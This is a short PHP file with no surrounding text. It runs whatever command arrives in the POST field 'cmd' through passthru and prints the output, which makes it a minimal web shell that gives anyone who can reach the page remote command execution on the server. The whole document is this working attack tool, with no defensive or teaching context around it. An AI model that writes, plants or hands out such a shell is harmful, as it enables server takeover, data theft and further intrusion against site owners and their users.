<?php
if (isset($_POST['cmd'])) {
    echo "<pre>";
    passthru($_POST['cmd']);
    echo "</pre>";
}
?>
